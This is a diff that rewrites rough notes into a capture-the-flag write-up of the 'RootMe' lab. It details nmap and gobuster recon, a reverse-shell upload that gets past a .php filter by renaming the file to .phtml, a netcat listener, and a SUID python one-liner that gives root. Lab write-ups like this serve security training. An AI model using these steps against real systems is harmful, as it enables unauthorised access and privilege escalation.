@@ -1,76 +1,52 @@
-nmap
+================================================================================
+CTF WRITEUP: ROOTME (FILE UPLOAD & SUID)
+Target IP: [TARGET_IP]
+================================================================================
 
-2 ports
+1. ENUMERATION & RECON
+--------------------------------------------------------------------------------
+Command: nmap -sC -sV [TARGET_IP]
+Results:
+- 22/tcp (SSH)   - OpenSSH 7.6p1
+- 80/tcp (HTTP)  - Apache 2.4.41
 
-Apache 2.4.41
+Web Discovery (Gobuster):
+- /panel/   : Upload page found.
+- /uploads/ : Directory where uploaded files are stored.
 
-Service 22
+2. INITIAL ACCESS (REVERSE SHELL)
+--------------------------------------------------------------------------------
+Payload: PentestMonkey PHP Reverse Shell.
+Filter Bypass: The server blocks ".php" files.
+Action: Renamed the file to "shell.phtml" to bypass the extension filter.
 
-ssh
+Execution:
+1. Start listener: nc -lvnp 4444
+2. Upload "shell.phtml" via /panel/.
+3. Execute via: http://[TARGET_IP]/uploads/shell.phtml
 
-gobuster
+Shell Stabilization:
+python -c 'import pty; pty.spawn("/bin/bash")'
+Result: Logged in as www-data.
 
-panel
-uploads ----- hidden directories
+User Flag: Found in /var/www/user.txt
 
-going into reverse shell
+3. PRIVILEGE ESCALATION (SUID)
+--------------------------------------------------------------------------------
+Search for SUID binaries:
+Command: find / -type f -perm -4000 2>/dev/null
 
-not likes .php
+Result: /usr/bin/python is set with SUID permissions. This allows the binary 
+to run with the privileges of the file owner (root).
 
-changed ip to kali machine
-port to 4444
-
-and file extension to phtml
-
-phpshell.phtml
-
-
-upload it
-
-nc -lnvp 4444
-
-/uploads
-
-run phpshell.phtml
-
-succesfull. need to stable the shell 
-
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
-
-
-who ami
-
-www-data
-
-try cd var/www
-
-user.txt
-
-got flag
+Exploitation (GTFOBins):
+Command: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 
-privilege escalation
 
-find / type f -- (file) -perm (PERMISSIONS) -4000 (corresponding to SUID)
-
-
-/usr/bin/python accessible without root permissions
-
-GTFOBins 
-
-python 
-
-SUID
-
-python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-
-whoami
-
-root
-
-cd /root
-
-root.txt
-
-flag
-
+4. FINAL FLAGS
+--------------------------------------------------------------------------------
+Verification: whoami -> root
+[USER] cat /var/www/user.txt
+[ROOT] cat /root/root.txt
+================================================================================
